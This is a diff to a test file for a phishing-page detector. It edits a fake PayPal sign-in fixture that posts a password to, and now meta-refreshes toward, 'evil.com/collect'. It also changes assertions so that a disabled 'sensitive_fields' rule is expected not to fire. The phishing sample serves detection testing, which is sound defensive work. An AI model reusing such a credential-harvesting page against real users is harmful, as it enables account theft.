@@ -33,7 +33,9 @@ from helpers import (
 # deterministic range (sensitive_fields + brand_domain_mismatch +
 # external_form_action) so contextual rules are exercised.
 HTML_PAYPAL_FAKE_WITH_EXTERNAL_FORM = """
-<html><head><title>PayPal Sign In</title></head>
+<html><head><title>PayPal Sign In</title>
+<meta http-equiv="refresh" content="0; url=https://evil.com/collect">
+</head>
 <body>
   <form action="https://evil.com/collect" method="post">
     <input type="password" name="password">
@@ -66,14 +68,14 @@ class TestStageAEvaluatorPipeline:
 
     def test_result_has_entry_for_every_rule(self):
         """Every deterministic rule should produce a RuleResult (triggered or skipped)."""
-        from backend.analysis.rules import DETERMINISTIC_RULES
+        from backend.analysis.rules import DETERMINISTIC_RULES, is_rule_enabled
 
         features = make_features("https://example.com", HTML_BENIGN)
         with patch(_BLACKLIST_MOCK, return_value=(False, "not listed")):
             result = StageAEvaluator().evaluate(features)
 
         rule_ids = {r.rule_id for r in result.rule_results}
-        expected_ids = {r.rule_id for r in DETERMINISTIC_RULES}
+        expected_ids = {r.rule_id for r in DETERMINISTIC_RULES if is_rule_enabled(r.rule_id)}
         assert rule_ids == expected_ids
 
 
@@ -149,10 +151,10 @@ class TestStageADecisions:
         features = make_features("https://paypal-fake.com/login", HTML_PAYPAL_TITLE)
         with patch(_BLACKLIST_MOCK, return_value=(False, "not listed")):
             result = StageAEvaluator().evaluate(features)
-        # Both brand_domain_mismatch and sensitive_fields should have fired
+        # brand_domain_mismatch should have fired (sensitive_fields is disabled in code)
         triggered = [r.rule_id for r in result.rule_results if r.triggered]
         assert "brand_domain_mismatch" in triggered
-        assert "sensitive_fields" in triggered
+        assert "sensitive_fields" not in triggered
         assert result.risk_score > 0.0
 
     def test_ip_based_url_raises_score(self):
